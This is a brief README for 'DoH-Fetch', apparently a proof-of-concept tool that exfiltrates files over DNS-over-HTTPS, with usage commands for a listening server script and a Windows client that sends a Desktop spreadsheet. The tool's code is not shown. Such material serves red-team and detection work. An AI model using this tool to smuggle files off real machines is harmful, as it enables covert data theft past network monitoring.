# DoH-Fetch
Simple proof of concept project to exfiltrate files via DoH

# Usage
```bash
# server
sudo systemctl stop systemd-resolved.service
sudo python3 dnspad.py
# files are stored in directory: files/<date>_combined.bin
```
```powershell
# client
.\fetch.exe -f '.\Desktop\test.xlsx'
```
